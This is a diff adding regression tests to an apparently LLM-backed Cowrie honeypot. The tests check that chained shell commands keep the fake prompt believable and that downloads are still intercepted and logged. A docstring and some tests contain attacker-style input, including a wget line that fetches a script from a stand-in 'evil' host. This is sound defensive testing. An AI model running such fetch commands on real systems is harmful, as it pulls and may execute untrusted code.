@@ -781,3 +781,133 @@ class TestTokenBudget(unittest.TestCase):
         self.tr.clear()
         self.proto.lineReceived(b"whoami")
         self.assertNotIn(b"cannot fork", self.tr.value())
+
+
+class TestChainedCommands(unittest.TestCase):
+    """Regression tests for the fastpath's whitespace-token dispatch.
+
+    `_try_fastpath` used to do `stripped.split(None, 1)` and hand the whole
+    remainder to `_handle_cd`, which accepts any string starting with "/"
+    as a directory. Two consequences, both live:
+
+      * `cd /tmp || cd /var/run || cd /` set cwd to that entire string, and
+        the prompt rendered it verbatim — `root@host:/tmp || cd /var/run...#`
+        No shell does that. One command, no model call, unmistakable.
+      * `cd /tmp && wget http://evil/x` never reached the download
+        interceptor, so the payload we exist to capture was discarded.
+
+    Found by scripts/probe_search.py at depth 1.
+    """
+
+    def tearDown(self) -> None:
+        for proto in getattr(self, "_protos", []):
+            try:
+                proto.setTimeout(None)
+            except Exception:
+                pass
+
+    def _session(self, **kw):
+        proto, tr, stub = _make_protocol(**kw)
+        self._protos = getattr(self, "_protos", [])
+        self._protos.append(proto)
+        return proto, tr, stub
+
+    # -- the prompt must never echo attacker input ------------------------
+
+    def test_chained_cd_does_not_corrupt_the_prompt(self):
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"cd /tmp || cd /var/run || cd /mnt")
+        self.assertEqual(proto.cwd, "/tmp")
+        self.assertNotIn(b"||", tr.value())
+
+    def test_every_fastpath_verb_rejects_operators(self):
+        for line in (
+            "cd /tmp && id",
+            "cd /tmp ; id",
+            "pwd && id",
+            "pwd ; id",
+            "cd /tmp > /dev/null",
+        ):
+            proto, tr, _ = self._session()
+            proto.lineReceived(line.encode())
+            self.assertNotIn(
+                b"&&", tr.value(), f"{line}: operator reached the terminal"
+            )
+            self.assertNotIn(b"||", tr.value(), line)
+            # cwd must always remain a plausible absolute path.
+            self.assertNotIn("&", proto.cwd, line)
+            self.assertNotIn(";", proto.cwd, line)
+            self.assertNotIn(" ", proto.cwd, line)
+
+    # -- real shell semantics ---------------------------------------------
+
+    def test_or_short_circuits_after_success(self):
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"cd /tmp || cd /var/run")
+        self.assertEqual(proto.cwd, "/tmp", "|| ran despite the left side succeeding")
+
+    def test_and_continues_after_success(self):
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"cd /tmp && cd /var")
+        self.assertEqual(proto.cwd, "/var")
+
+    def test_semicolon_always_continues(self):
+        proto, tr, _ = self._session()
+        proto.lineReceived(b"pwd ; whoami")
+        out = tr.value()
+        self.assertIn(b"/", out)
+        self.assertIn(b"root", out)
+
+    def test_exactly_one_prompt_per_line(self):
+        """A doubled prompt is its own tell — real shells emit one."""
+        for line in ("cd /tmp && cd /var", "pwd ; whoami", "cd /a || cd /b"):
+            proto, tr, _ = self._session()
+            proto.lineReceived(line.encode())
+            self.assertEqual(
+                tr.value().count(b"root@"), 1, f"{line}: wrong prompt count"
+            )
+
+    # -- payload capture must survive chaining ----------------------------
+
+    def test_chained_download_still_reaches_the_interceptor(self):
+        proto, _tr, _ = self._session()
+        seen: list[str] = []
+        # Record the routing without letting the real fetch start — it
+        # would resolve DNS and leave the trial reactor dirty.
+        proto._try_download_intercept = lambda c: (seen.append(c), True)[1]
+        proto.lineReceived(b"cd /tmp && wget http://example.com/x.sh")
+        self.assertEqual(seen, ["wget http://example.com/x.sh"])
+        self.assertEqual(proto.cwd, "/tmp")
+
+    def test_intercept_is_logged_at_attempt_time(self):
+        """The fetch is asynchronous, so without an attempt event a fetch
+        that never completes leaves no trace at all — an operator cannot
+        tell 'never fetched' from 'fetched and lost'."""
+        from twisted.internet import defer
+
+        from cowrie.llm import downloader as dlmod
+        from cowrie.llm import protocol as protomod
+
+        events: list[dict] = []
+        self.patch(protomod.log, "msg", lambda *a, **k: events.append(k))
+        # Never-firing Deferred: exercises the attempt path without any
+        # network, and leaves the reactor clean.
+        self.patch(dlmod, "fetch", lambda *a, **k: defer.Deferred())
+        proto, _tr, _ = self._session()
+        proto.lineReceived(b"wget http://example.com/x.sh")
+        ids = [e.get("eventid") for e in events]
+        self.assertIn("cowrie.llm.download_intercept", ids)
+
+    # -- unchained lines are untouched ------------------------------------
+
+    def test_simple_commands_are_unaffected(self):
+        proto, tr, stub = self._session()
+        proto.lineReceived(b"whoami")
+        self.assertEqual(len(stub.calls), 0)
+        self.assertIn(b"root", tr.value())
+
+    def test_quoted_operators_do_not_split(self):
+        proto, _tr, stub = self._session()
+        proto.lineReceived(b'echo "a && b"')
+        # Handled somewhere sane; the point is it is treated as one command.
+        self.assertLessEqual(len(stub.calls), 1)
